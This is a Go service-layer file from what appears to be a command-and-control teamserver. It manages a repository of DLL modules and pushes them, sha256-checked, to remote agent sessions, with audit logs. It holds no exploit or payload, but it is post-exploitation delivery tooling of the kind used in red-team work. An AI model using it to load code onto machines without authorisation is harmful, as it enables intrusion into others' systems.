// 模块仓库用例。搬运自 api/modules.go 与 cli/cli_module.go。
package service

import (
	"io"

	"cleat/teamserver/internal/logx"
	"cleat/teamserver/internal/modules"
)

// ValidateModuleName 模块名合法性校验(原入口层直调 modules.ValidateName, 随下沉改经服务层)。
func (s *Service) ValidateModuleName(name string) error { return modules.ValidateName(name) }

// ModuleGet 读模块字节。CLI moduleLoad 的三段式路径用(与 ModuleLoad 的合并路径并存
// 是历史路径差异: CLI 需区分"获取失败/哈希失败/下发失败"三种输出, 原样保留)。
func (s *Service) ModuleGet(name string) ([]byte, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	return s.modRepo.Get(name)
}

// ModuleHash 读模块哈希信息(CLI 三段式路径用)。
func (s *Service) ModuleHash(name string) (*modules.ModuleInfo, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	return s.modRepo.Info(name)
}

// ModuleList 列出所有模块。搬运自 api.moduleList / cli.moduleList 数据源。
func (s *Service) ModuleList() ([]modules.ModuleInfo, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	return s.modRepo.List()
}

// ModuleUpload 从流保存模块(HTTP 上传路径, 带 32MB 流式上限)。搬运自 api.moduleUpload 主体。
func (s *Service) ModuleUpload(op, name string, r io.Reader) (*modules.ModuleInfo, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	info, err := s.modRepo.SaveFromReader(name, r, modules.MaxModuleSize)
	if err != nil {
		return nil, err
	}
	if op != "" {
		logx.Printf("[audit] op=%s 上传模块 %s (%d bytes)\n", op, info.Name, info.Size)
	}
	return info, nil
}

// ModuleSave 从内存字节保存模块(CLI 路径)。搬运自 cli.moduleUpload 的 Save 调用。
// 与 ModuleUpload 的差异是历史路径差异(CLI 无流式上限包装, Save 自带 MaxModuleSize 检查), 原样保留。
func (s *Service) ModuleSave(op, name string, data []byte) (*modules.ModuleInfo, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	return s.modRepo.Save(name, data)
}

// ModuleDelete 删除模块。搬运自 api.moduleDelete / cli.moduleDelete 主体。
func (s *Service) ModuleDelete(op, name string) error {
	if s.modRepo == nil {
		return fail("模块仓库未初始化")
	}
	if err := s.modRepo.Delete(name); err != nil {
		return err
	}
	if op != "" {
		logx.Printf("[audit] op=%s 删除模块 %s\n", op, name)
	}
	return nil
}

// ModuleLoad 按名下发模块到会话(hybrid 通道, sha256 闭环)。搬运自 api.moduleLoad / cli.moduleLoad 主体。
func (s *Service) ModuleLoad(op string, sid int, name string) (map[string]interface{}, error) {
	if s.modRepo == nil {
		return nil, fail("模块仓库未初始化")
	}
	// 从仓库读取 DLL 字节
	dllBytes, err := s.modRepo.Get(name)
	if err != nil {
		return nil, err
	}
	// sha256 闭环: Agent 侧 ModuleLoad 对 params.sha256(64hex) 强校验, 缺失即校验形同虚设
	info, err := s.modRepo.Info(name)
	if err != nil || info.SHA256 == "" {
		return nil, fail("读取模块哈希失败, 拒绝下发")
	}
	// 调用 hybrid 通道下发
	resp, err := s.mgr.APIHybridUpload(sid,
		map[string]interface{}{
			"cmd": "ModuleLoad",
			"params": map[string]interface{}{
				"module_id": name,
				"type":      1,
				"platform":  1,
				"sha256":    info.SHA256,
			},
		}, dllBytes)
	if err != nil {
		return nil, err
	}
	if op != "" {
		logx.Printf("[audit] op=%s 下发模块 %s → 会话 #%d (sha256=%s)\n", op, name, sid, info.SHA256)
	}
	return resp, nil
}
